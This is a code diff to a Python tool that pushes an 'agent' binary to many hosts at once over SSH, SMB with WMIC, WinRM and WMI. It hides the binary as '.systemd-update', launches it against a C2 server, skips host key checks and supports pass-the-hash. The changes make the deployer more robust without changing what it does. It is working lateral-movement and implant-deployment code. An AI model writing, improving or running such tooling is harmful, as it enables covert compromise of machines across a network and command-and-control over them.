@@ -10,7 +10,7 @@ Usage:
 """
 
 import os
-import sys
+import shutil
 import time
 import argparse
 import subprocess
@@ -49,73 +49,95 @@ def get_agent_binary():
 
 def deploy_ssh(target, user, password, port, server_addr, results):
     """Deploy via SSH."""
-    agent_bin = get_agent_binary()
-    if not agent_bin:
-        results[target] = ("FAIL", "No agent binary found")
-        return
-    
-    remote_path = "/tmp/.systemd-update"
-    
     try:
-        # Upload agent
-        scp_cmd = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no -P {port} {agent_bin} {user}@{target}:{remote_path}"
-        r = subprocess.run(scp_cmd, shell=True, capture_output=True, text=True, timeout=30)
-        if r.returncode != 0:
-            results[target] = ("FAIL", f"SCP failed: {r.stderr[:100]}")
+        agent_bin = get_agent_binary()
+        if not agent_bin:
+            results[target] = ("FAIL", "No agent binary found")
             return
-        
-        # Make executable and run
-        ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -P {port} {user}@{target} 'chmod +x {remote_path} && nohup {remote_path} --server {server_addr} &>/dev/null &'"
-        r = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
+
+        sshpass = shutil.which("sshpass")
+        if not sshpass:
+            results[target] = ("FAIL", "sshpass not found in PATH")
+            return
+
+        remote_path = "/tmp/.systemd-update"
+        # Password via SSHPASS env (sshpass -e): no secrets on the command line,
+        # and argument lists avoid shell interpolation of user/password.
+        env = {**os.environ, "SSHPASS": password}
+
+        # Upload agent (scp uses -P for port)
+        r = subprocess.run(
+            [sshpass, "-e", "scp", "-o", "StrictHostKeyChecking=no", "-P", str(port),
+             agent_bin, f"{user}@{target}:{remote_path}"],
+            env=env, capture_output=True, text=True, timeout=30)
+        if r.returncode != 0:
+            results[target] = ("FAIL", f"SCP failed: {(r.stderr or '').strip()[:100]}")
+            return
+
+        # Make executable and run (ssh uses lowercase -p for port)
+        r = subprocess.run(
+            [sshpass, "-e", "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port),
+             f"{user}@{target}",
+             f"chmod +x {remote_path} && nohup {remote_path} --server {server_addr} >/dev/null 2>&1 &"],
+            env=env, capture_output=True, text=True, timeout=30)
         if r.returncode == 0:
             results[target] = ("OK", "Deployed via SSH")
         else:
-            results[target] = ("FAIL", f"SSH exec failed: {r.stderr[:100]}")
+            results[target] = ("FAIL", f"SSH exec failed: {(r.stderr or '').strip()[:100]}")
     except Exception as e:
         results[target] = ("FAIL", str(e))
 
-def deploy_smb(target, user, password, server_addr, results):
-    """Deploy via SMB (Windows)."""
-    agent_bin = get_agent_binary()
-    if not agent_bin:
-        results[target] = ("FAIL", "No agent binary found")
-        return
-    
+def deploy_smb(target, user, password, port, server_addr, results):
+    """Deploy via SMB (Windows). `port` unused (SMB uses 445); kept for uniform worker signature."""
     try:
-        # Use impacket's smbexec or psexec if available
-        share = "C$"
-        remote_path = f"\\\\{target}\\{share}\\Windows\\Temp\\.systemd-update.exe"
-        
-        # Try to copy via smbclient
-        smb_cmd = f'smbclient //{target}/{share.replace("$", "")} -U {user}%{password} -c "put {agent_bin} Windows/Temp/.systemd-update.exe"'
-        r = subprocess.run(smb_cmd, shell=True, capture_output=True, text=True, timeout=30)
-        
+        agent_bin = get_agent_binary()
+        if not agent_bin:
+            results[target] = ("FAIL", "No agent binary found")
+            return
+
+        smbclient = shutil.which("smbclient")
+        if not smbclient:
+            results[target] = ("FAIL", "smbclient not found in PATH")
+            return
+
+        # Try to copy via smbclient (argument list: credentials never hit a shell)
+        r = subprocess.run(
+            [smbclient, f"//{target}/C", "-U", f"{user}%{password}",
+             "-c", f"put {agent_bin} Windows/Temp/.systemd-update.exe"],
+            capture_output=True, text=True, timeout=30)
+
         if r.returncode == 0:
-            # Execute via wmic or psexec
-            wmic_cmd = f'wmic /node:{target} /user:{user} /password:{password} process call create "C:\\Windows\\Temp\\.systemd-update.exe --server {server_addr}"'
-            r2 = subprocess.run(wmic_cmd, shell=True, capture_output=True, text=True, timeout=30)
+            # Execute via wmic
+            wmic = shutil.which("wmic")
+            if not wmic:
+                results[target] = ("PARTIAL", "Uploaded but wmic not available")
+                return
+            r2 = subprocess.run(
+                [wmic, f"/node:{target}", f"/user:{user}", f"/password:{password}",
+                 "process", "call", "create",
+                 f"C:\\Windows\\Temp\\.systemd-update.exe --server {server_addr}"],
+                capture_output=True, text=True, timeout=30)
             if r2.returncode == 0:
                 results[target] = ("OK", "Deployed via SMB+WMIC")
             else:
                 results[target] = ("PARTIAL", "Uploaded but execution failed")
         else:
-            results[target] = ("FAIL", f"SMB copy failed: {r.stderr[:100]}")
+            results[target] = ("FAIL", f"SMB copy failed: {(r.stderr or '').strip()[:100]}")
     except Exception as e:
         results[target] = ("FAIL", str(e))
 
-def deploy_winrm(target, user, password, server_addr, results):
-    """Deploy via WinRM (Windows)."""
-    agent_bin = get_agent_binary()
-    if not agent_bin:
-        results[target] = ("FAIL", "No agent binary found")
-        return
-    
+def deploy_winrm(target, user, password, port, server_addr, results):
+    """Deploy via WinRM (Windows). `port`/`server_addr` unused here; kept for uniform signature."""
     try:
-        # Use evil-winrm or winrs if available
+        winrs = shutil.which("winrs")
+        if not winrs:
+            results[target] = ("FAIL", "winrs not found in PATH")
+            return
         # First try winrs (built into Windows)
-        winrs_cmd = f'winrs -r:http://{target}:5985 -u:{user} -p:{password} "cmd /c echo test"'
-        r = subprocess.run(winrs_cmd, shell=True, capture_output=True, text=True, timeout=10)
-        
+        r = subprocess.run(
+            [winrs, f"-r:http://{target}:5985", f"-u:{user}", f"-p:{password}", "cmd /c echo test"],
+            capture_output=True, text=True, timeout=10)
+
         if r.returncode == 0:
             # Upload via SMB then execute via WinRM
             results[target] = ("OK", "WinRM reachable — use SMB for upload")
@@ -124,13 +146,18 @@ def deploy_winrm(target, user, password, server_addr, results):
     except Exception as e:
         results[target] = ("FAIL", str(e))
 
-def deploy_wmi(target, user, password, server_addr, results):
-    """Deploy via WMI (Windows)."""
+def deploy_wmi(target, user, password, port, server_addr, results):
+    """Deploy via WMI (Windows). `port`/`server_addr` unused here; kept for uniform signature."""
     try:
-        # Use impacket's wmiexec
-        wmi_cmd = f'wmiexec.py {user}:{password}@{target} "cmd.exe /c echo test"'
-        r = subprocess.run(wmi_cmd, shell=True, capture_output=True, text=True, timeout=30)
-        
+        wmiexec = shutil.which("wmiexec.py") or shutil.which("wmiexec")
+        if not wmiexec:
+            results[target] = ("FAIL", "wmiexec.py (impacket) not found in PATH")
+            return
+        # Use impacket's wmiexec (argument list: password never hits a shell)
+        r = subprocess.run(
+            [wmiexec, f"{user}:{password}@{target}", "cmd.exe /c echo test"],
+            capture_output=True, text=True, timeout=30)
+
         if r.returncode == 0:
             results[target] = ("OK", "WMI reachable")
         else:
@@ -147,7 +174,7 @@ def main():
     parser.add_argument("--password", "-p", default="", help="Password")
     parser.add_argument("--hashes", "-H", default="", help="NTLM hashes (pass-the-hash)")
     parser.add_argument("--method", "-m", choices=["ssh", "smb", "winrm", "wmi"], default="ssh", help="Deployment method")
-    parser.add_argument("--port", default=22, help="SSH port (default: 22)")
+    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
     parser.add_argument("--server", "-s", default=None, help="C2 server address (auto-detect)")
     parser.add_argument("--threads", default=10, type=int, help="Concurrent threads")
     args = parser.parse_args()
@@ -160,7 +187,8 @@ def main():
             s.connect(("8.8.8.8", 80))
             args.server = s.getsockname()[0] + ":8443"
             s.close()
-        except:
+        except Exception as e:
+            print(f"{YELLOW}[!] IP auto-detect failed ({e}); using 127.0.0.1:8443{RESET}")
             args.server = "127.0.0.1:8443"
     
     targets = load_targets(args.targets)
@@ -181,11 +209,16 @@ def main():
     }[args.method]
     
     print(f"{YELLOW}Deploying to {len(targets)} targets...{RESET}\n")
-    
+
+    def worker(target):
+        """Thread body: never let an exception escape silently; record it instead."""
+        try:
+            deploy_func(target, args.user, args.password, args.port, args.server, results)
+        except Exception as e:
+            results[target] = ("FAIL", str(e))
+
     for target in targets:
-        t = threading.Thread(target=deploy_func, args=(
-            target, args.user, args.password, args.port, args.server, results
-        ))
+        t = threading.Thread(target=worker, args=(target,))
         threads.append(t)
         t.start()
         
